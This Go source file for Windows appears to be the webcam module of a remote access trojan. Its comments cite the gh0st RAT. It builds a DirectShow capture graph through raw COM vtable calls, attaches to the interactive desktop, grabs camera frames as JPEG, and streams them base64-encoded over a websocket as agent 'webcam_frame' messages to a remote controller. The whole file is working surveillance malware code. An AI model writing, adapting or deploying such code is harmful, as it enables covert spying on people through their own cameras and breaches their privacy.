//go:build windows

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	"image/color"
	"image/jpeg"
	"runtime"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/gorilla/websocket"
)

// ═══ DirectShow COM 摄像头采集 ═══
// 参考 gh0st RAT — 使用 DirectShow (qedit.h) SampleGrabber 方式
// 兼容所有 Windows 7+ 摄像头（不依赖 legacy avicap32/VFW）

var (
	modOle32 = syscall.NewLazyDLL("ole32.dll")

	procCoInitializeEx   = modOle32.NewProc("CoInitializeEx")
	procCoUninitialize   = modOle32.NewProc("CoUninitialize")
	procCoCreateInstance = modOle32.NewProc("CoCreateInstance")
	procCoTaskMemFree    = modOle32.NewProc("CoTaskMemFree")
)

// ═══ COM GUID 定义（复用 _GUID from dxgi_capture_windows.go）═══

var (
	// CLSID
	clsidSystemDeviceEnum    = _GUID{0x62BE5D10, 0x60EB, 0x11d0, [8]byte{0xA5, 0xD0, 0x00, 0xA0, 0xC9, 0x22, 0x31, 0x96}}
	clsidFilterGraph         = _GUID{0xe436ebb3, 0x524f, 0x11ce, [8]byte{0x9f, 0x53, 0x00, 0x20, 0xaf, 0x0b, 0xa7, 0x70}}
	clsidCaptureGraphBuilder = _GUID{0xBF87B6E1, 0x8C27, 0x11d0, [8]byte{0xB3, 0xF0, 0x00, 0xAA, 0x00, 0x37, 0x61, 0xC5}}
	clsidSampleGrabber       = _GUID{0xC1F400A0, 0x3F08, 0x11d3, [8]byte{0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37}}
	clsidNullRenderer        = _GUID{0xC1F400A4, 0x3F08, 0x11d3, [8]byte{0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37}}
	// IID
	iidICreateDevEnum    = _GUID{0x29840822, 0x5B84, 0x11D0, [8]byte{0xBD, 0x3B, 0x00, 0xA0, 0xC9, 0x11, 0xCE, 0x86}}
	iidIGraphBuilder     = _GUID{0x56a868a9, 0x0ad4, 0x11ce, [8]byte{0xb0, 0x3a, 0x00, 0x20, 0xaf, 0x0b, 0xa7, 0x70}}
	iidIBaseFilter       = _GUID{0x56a86895, 0x0ad4, 0x11ce, [8]byte{0xb0, 0x3a, 0x00, 0x20, 0xaf, 0x0b, 0xa7, 0x70}}
	iidICaptureGraphBld2 = _GUID{0x93E5A4E0, 0x2D50, 0x11d2, [8]byte{0xAB, 0xFA, 0x00, 0xA0, 0xC9, 0xC6, 0xE3, 0x8D}}
	iidISampleGrabber    = _GUID{0x6B652FFF, 0x11FE, 0x4fce, [8]byte{0x92, 0xAD, 0x02, 0x66, 0xB5, 0xD7, 0xC7, 0x8F}}
	iidIMediaControl     = _GUID{0x56a868b1, 0x0ad4, 0x11ce, [8]byte{0xb0, 0x3a, 0x00, 0x20, 0xaf, 0x0b, 0xa7, 0x70}}
	// 媒体类型
	mediaTypeVideo = _GUID{0x73646976, 0x0000, 0x0010, [8]byte{0x80, 0x00, 0x00, 0xAA, 0x00, 0x38, 0x9B, 0x71}}
	mediaSubRGB24  = _GUID{0xe436eb7d, 0x524f, 0x11ce, [8]byte{0x9f, 0x53, 0x00, 0x20, 0xaf, 0x0b, 0xa7, 0x70}}
	// PIN 类别
	pinCatCapture = _GUID{0xfb6c4281, 0x0353, 0x11d1, [8]byte{0x90, 0x5f, 0x00, 0x00, 0xc0, 0xcc, 0x16, 0xba}}
	pinCatPreview = _GUID{0xfb6c4282, 0x0353, 0x11d1, [8]byte{0x90, 0x5f, 0x00, 0x00, 0xc0, 0xcc, 0x16, 0xba}}
	// 设备枚举类别
	catVideoInput = _GUID{0x860BB310, 0x5D01, 0x11d0, [8]byte{0xBD, 0x3B, 0x00, 0xA0, 0xC9, 0x11, 0xCE, 0x86}}
)

// AM_MEDIA_TYPE 结构 (简化版，只保留关键字段)
type amMediaType struct {
	majortype  _GUID
	subtype    _GUID
	bFixedSize int32
	bTemporary int32
	lSampleSz  uint32
	formattype _GUID
	pUnk       uintptr
	cbFormat   uint32
	pbFormat   uintptr
}

// ═══ COM vtable 调用辅助（comCall / comRelease 复用 dxgi_capture_windows.go）═══

func dsComVtbl(obj uintptr, idx int) uintptr {
	vtbl := *(*uintptr)(unsafe.Pointer(obj))
	return *(*uintptr)(unsafe.Pointer(vtbl + uintptr(idx)*unsafe.Sizeof(uintptr(0))))
}

func dsComQI(obj uintptr, iid *_GUID, out *uintptr) int32 {
	r, _, _ := syscall.Syscall(dsComVtbl(obj, 0), 3, obj, uintptr(unsafe.Pointer(iid)), uintptr(unsafe.Pointer(out)))
	return int32(r)
}

// ═══ DirectShow 图构建 ═══

// dsGraph 持有 DirectShow 捕获图的所有 COM 对象
type dsGraph struct {
	pGraph      uintptr // IGraphBuilder
	pCapBld     uintptr // ICaptureGraphBuilder2
	pCapFilter  uintptr // IBaseFilter (capture device)
	pGrabber    uintptr // ISampleGrabber
	pGrabFilter uintptr // IBaseFilter (from grabber QI)
	pNullRend   uintptr // IBaseFilter (null renderer)
	pMC         uintptr // IMediaControl
	width       int
	height      int
}

func (g *dsGraph) cleanup() {
	if g.pMC != 0 {
		// IMediaControl::Stop (vtable index 9 for IMediaControl on IGraphBuilder)
		syscall.Syscall(dsComVtbl(g.pMC, 6), 1, g.pMC, 0, 0)
		comRelease(g.pMC)
		g.pMC = 0
	}
	comRelease(g.pNullRend)
	g.pNullRend = 0
	comRelease(g.pGrabFilter)
	g.pGrabFilter = 0
	comRelease(g.pGrabber)
	g.pGrabber = 0
	comRelease(g.pCapFilter)
	g.pCapFilter = 0
	comRelease(g.pCapBld)
	g.pCapBld = 0
	comRelease(g.pGraph)
	g.pGraph = 0
}

// dsInit 初始化 DirectShow 捕获图（同 C# DsInitGraph / gh0st 流程）
func dsInit() (*dsGraph, error) {
	g := &dsGraph{width: 640, height: 480}

	// 1. 枚举视频设备
	var pDevEnum uintptr
	hr, _, _ := procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsidSystemDeviceEnum)), 0, 1,
		uintptr(unsafe.Pointer(&iidICreateDevEnum)), uintptr(unsafe.Pointer(&pDevEnum)))
	if int32(hr) < 0 {
		return nil, fmt.Errorf("CreateDevEnum failed: 0x%08x", uint32(hr))
	}
	defer comRelease(pDevEnum)

	// ICreateDevEnum::CreateClassEnumerator (vtable index 3)
	var pEnumMon uintptr
	hr, _, _ = syscall.Syscall6(dsComVtbl(pDevEnum, 3), 4,
		pDevEnum, uintptr(unsafe.Pointer(&catVideoInput)), uintptr(unsafe.Pointer(&pEnumMon)), 0, 0, 0)
	if int32(hr) < 0 || pEnumMon == 0 {
		return nil, fmt.Errorf("no video device class")
	}
	defer comRelease(pEnumMon)

	// IEnumMoniker::Next (vtable index 3)
	var pMoniker uintptr
	var fetched uint32
	hr, _, _ = syscall.Syscall6(dsComVtbl(pEnumMon, 3), 4,
		pEnumMon, 1, uintptr(unsafe.Pointer(&pMoniker)), uintptr(unsafe.Pointer(&fetched)), 0, 0)
	if int32(hr) != 0 || pMoniker == 0 {
		return nil, fmt.Errorf("未检测到摄像头")
	}
	defer comRelease(pMoniker)

	// 2. IMoniker::BindToObject → IBaseFilter (vtable index 8)
	hr, _, _ = syscall.Syscall6(dsComVtbl(pMoniker, 8), 5,
		pMoniker, 0, 0, uintptr(unsafe.Pointer(&iidIBaseFilter)), uintptr(unsafe.Pointer(&g.pCapFilter)), 0)
	if int32(hr) < 0 {
		return nil, fmt.Errorf("bind device failed: 0x%08x", uint32(hr))
	}

	// 3. 创建 FilterGraph
	hr, _, _ = procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsidFilterGraph)), 0, 1,
		uintptr(unsafe.Pointer(&iidIGraphBuilder)), uintptr(unsafe.Pointer(&g.pGraph)))
	if int32(hr) < 0 {
		g.cleanup()
		return nil, fmt.Errorf("create FilterGraph failed")
	}

	// 4. 创建 CaptureGraphBuilder2
	hr, _, _ = procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsidCaptureGraphBuilder)), 0, 1,
		uintptr(unsafe.Pointer(&iidICaptureGraphBld2)), uintptr(unsafe.Pointer(&g.pCapBld)))
	if int32(hr) < 0 {
		g.cleanup()
		return nil, fmt.Errorf("create CaptureGraphBuilder failed")
	}
	// ICaptureGraphBuilder2::SetFiltergraph (vtable index 3)
	syscall.Syscall(dsComVtbl(g.pCapBld, 3), 2, g.pCapBld, g.pGraph, 0)

	// 5. 添加捕获设备到图  IGraphBuilder::AddFilter (vtable index 3, but IGraphBuilder extends IFilterGraph: AddFilter is at vtable 3)
	capName, _ := syscall.UTF16PtrFromString("Capture")
	syscall.Syscall(dsComVtbl(g.pGraph, 3), 3, g.pGraph, g.pCapFilter, uintptr(unsafe.Pointer(capName)))

	// 6. 创建 SampleGrabber
	hr, _, _ = procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsidSampleGrabber)), 0, 1,
		uintptr(unsafe.Pointer(&iidISampleGrabber)), uintptr(unsafe.Pointer(&g.pGrabber)))
	if int32(hr) < 0 {
		g.cleanup()
		return nil, fmt.Errorf("create SampleGrabber failed: 0x%08x", uint32(hr))
	}

	// 设置采集格式 RGB24
	var mt amMediaType
	mt.majortype = mediaTypeVideo
	mt.subtype = mediaSubRGB24
	// ISampleGrabber::SetMediaType (vtable index 4)
	syscall.Syscall(dsComVtbl(g.pGrabber, 4), 2, g.pGrabber, uintptr(unsafe.Pointer(&mt)), 0)

	// 7. QI → IBaseFilter，添加到图
	dsComQI(g.pGrabber, &iidIBaseFilter, &g.pGrabFilter)
	grabName, _ := syscall.UTF16PtrFromString("Grabber")
	syscall.Syscall(dsComVtbl(g.pGraph, 3), 3, g.pGraph, g.pGrabFilter, uintptr(unsafe.Pointer(grabName)))

	// 8. 创建 NullRenderer
	hr, _, _ = procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsidNullRenderer)), 0, 1,
		uintptr(unsafe.Pointer(&iidIBaseFilter)), uintptr(unsafe.Pointer(&g.pNullRend)))
	if int32(hr) < 0 {
		g.cleanup()
		return nil, fmt.Errorf("create NullRenderer failed")
	}
	nullName, _ := syscall.UTF16PtrFromString("Null")
	syscall.Syscall(dsComVtbl(g.pGraph, 3), 3, g.pGraph, g.pNullRend, uintptr(unsafe.Pointer(nullName)))

	// 9. RenderStream — 先尝试 Preview pin，再 Capture pin
	// ICaptureGraphBuilder2::RenderStream (vtable index 7)
	hr, _, _ = syscall.Syscall9(dsComVtbl(g.pCapBld, 7), 6,
		g.pCapBld, uintptr(unsafe.Pointer(&pinCatPreview)), uintptr(unsafe.Pointer(&mediaTypeVideo)),
		g.pCapFilter, g.pGrabFilter, g.pNullRend, 0, 0, 0)
	if int32(hr) < 0 {
		hr, _, _ = syscall.Syscall9(dsComVtbl(g.pCapBld, 7), 6,
			g.pCapBld, uintptr(unsafe.Pointer(&pinCatCapture)), uintptr(unsafe.Pointer(&mediaTypeVideo)),
			g.pCapFilter, g.pGrabFilter, g.pNullRend, 0, 0, 0)
	}
	if int32(hr) < 0 {
		g.cleanup()
		return nil, fmt.Errorf("RenderStream failed: 0x%08x", uint32(hr))
	}

	// 10. SetBufferSamples(TRUE)  ISampleGrabber::SetBufferSamples (vtable index 6)
	syscall.Syscall(dsComVtbl(g.pGrabber, 6), 2, g.pGrabber, 1, 0)

	// 11. 读取实际分辨率
	var connMT amMediaType
	// ISampleGrabber::GetConnectedMediaType (vtable index 5)
	hr2, _, _ := syscall.Syscall(dsComVtbl(g.pGrabber, 5), 2, g.pGrabber, uintptr(unsafe.Pointer(&connMT)), 0)
	if int32(hr2) >= 0 && connMT.pbFormat != 0 && connMT.cbFormat >= 60 {
		// VIDEOINFOHEADER: 2xRECT(32) + dwBitRate(4) + dwBitErrorRate(4) + AvgTimePerFrame(8) = 48
		// then BITMAPINFOHEADER: biSize(4), biWidth(4 @ offset 52), biHeight(4 @ offset 56)
		biW := *(*int32)(unsafe.Pointer(connMT.pbFormat + 52))
		biH := *(*int32)(unsafe.Pointer(connMT.pbFormat + 56))
		if biW > 0 {
			g.width = int(biW)
		}
		if biH < 0 {
			g.height = int(-biH)
		} else if biH > 0 {
			g.height = int(biH)
		}
		if connMT.pbFormat != 0 {
			procCoTaskMemFree.Call(connMT.pbFormat)
		}
	}

	// 12. 获取 IMediaControl
	dsComQI(g.pGraph, &iidIMediaControl, &g.pMC)
	if g.pMC == 0 {
		g.cleanup()
		return nil, fmt.Errorf("QI IMediaControl failed")
	}

	// 启动图
	// IMediaControl::Run (vtable index 5)
	syscall.Syscall(dsComVtbl(g.pMC, 5), 1, g.pMC, 0, 0)
	// 等待设备热身
	time.Sleep(800 * time.Millisecond)

	return g, nil
}

// dsGrabJPEG 从 SampleGrabber 抓取一帧并转为 JPEG
func (g *dsGraph) dsGrabJPEG(quality int) ([]byte, int, int, error) {
	// ISampleGrabber::GetCurrentBuffer (vtable index 7)
	// 先获取大小
	var bufSize int32
	hr, _, _ := syscall.Syscall(dsComVtbl(g.pGrabber, 7), 3, g.pGrabber, uintptr(unsafe.Pointer(&bufSize)), 0)
	if int32(hr) < 0 || bufSize <= 0 {
		return nil, 0, 0, fmt.Errorf("GetCurrentBuffer size failed: 0x%08x, size=%d", uint32(hr), bufSize)
	}

	// 分配缓冲并获取像素数据
	pixels := make([]byte, bufSize)
	hr, _, _ = syscall.Syscall(dsComVtbl(g.pGrabber, 7), 3, g.pGrabber, uintptr(unsafe.Pointer(&bufSize)), uintptr(unsafe.Pointer(&pixels[0])))
	if int32(hr) < 0 {
		return nil, 0, 0, fmt.Errorf("GetCurrentBuffer data failed: 0x%08x", uint32(hr))
	}

	w := g.width
	h := g.height
	bpp := int(bufSize) / (w * h)
	if bpp < 3 {
		bpp = 3
	}
	if bpp > 4 {
		bpp = 3
	}
	stride := w * bpp

	// RGB24/RGB32 bottom-up → JPEG
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		srcY := h - 1 - y // bottom-up
		srcOff := srcY * stride
		if srcOff+stride > len(pixels) {
			srcOff = y * stride
		}
		for x := 0; x < w; x++ {
			off := srcOff + x*bpp
			if off+bpp > len(pixels) {
				break
			}
			img.SetRGBA(x, y, color.RGBA{R: pixels[off+2], G: pixels[off+1], B: pixels[off], A: 255})
		}
	}

	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
		return nil, 0, 0, err
	}
	return buf.Bytes(), w, h, nil
}

// ═══ 公共接口 ═══

// captureFrameNative 使用 DirectShow 原生采集单帧，失败则回退 Media Foundation
func captureFrameNative() ([]byte, int, int, error) {
	// 方式1: DirectShow
	jpg, w, h, dsErr := dsCaptureFrameOnce()
	if dsErr == nil {
		return jpg, w, h, nil
	}

	// 方式2: Media Foundation
	if mfAvailable() {
		jpg, w, h, mfErr := mfCaptureFrame()
		if mfErr == nil {
			return jpg, w, h, nil
		}
		return nil, 0, 0, fmt.Errorf("DS: %v; MF: %v", dsErr, mfErr)
	}

	return nil, 0, 0, dsErr
}

// dsCaptureFrameOnce DirectShow 单帧采集
func dsCaptureFrameOnce() ([]byte, int, int, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	attachToInteractiveDesktop()

	hr, _, _ := procCoInitializeEx.Call(0, 0x2)
	if int32(hr) < 0 && hr != 1 {
		hr, _, _ = procCoInitializeEx.Call(0, 0x0)
	}
	defer procCoUninitialize.Call()

	g, err := dsInit()
	if err != nil {
		return nil, 0, 0, err
	}
	defer g.cleanup()

	for attempt := 0; attempt < 10; attempt++ {
		jpgData, w, h, err := g.dsGrabJPEG(75)
		if err == nil {
			return jpgData, w, h, nil
		}
		time.Sleep(200 * time.Millisecond)
	}
	return nil, 0, 0, fmt.Errorf("DirectShow: 10次抓帧均失败")
}

// tryNativeWebcamStream 使用 DirectShow 原生流式采集，失败则回退 Media Foundation
func tryNativeWebcamStream(conn *websocket.Conn, writeMu *sync.Mutex, stopCh chan struct{}) bool {
	// 先尝试 Media Foundation（在 DirectShow 不可用的机器上更可靠）
	if tryMFWebcamStream(conn, writeMu, stopCh) {
		return true
	}

	// 回退 DirectShow
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	attachToInteractiveDesktop()

	hr, _, _ := procCoInitializeEx.Call(0, 0x2)
	if int32(hr) < 0 && hr != 1 {
		hr, _, _ = procCoInitializeEx.Call(0, 0x0)
	}
	_ = hr
	defer procCoUninitialize.Call()

	g, err := dsInit()
	if err != nil {
		return false
	}
	defer g.cleanup()

	for {
		select {
		case <-stopCh:
			return true
		default:
		}

		jpgData, w, h, err := g.dsGrabJPEG(65)
		if err != nil {
			time.Sleep(300 * time.Millisecond)
			continue
		}

		b64 := base64.StdEncoding.EncodeToString(jpgData)
		framePayload, _ := json.Marshal(map[string]interface{}{
			"image":  b64,
			"width":  w,
			"height": h,
			"size":   len(jpgData),
		})
		resp, _ := json.Marshal(AgentMessage{Type: c2e("webcam_frame"), Payload: framePayload})
		writeMu.Lock()
		conn.WriteMessage(websocket.TextMessage, resp)
		writeMu.Unlock()

		time.Sleep(100 * time.Millisecond) // ~10 FPS
	}
}
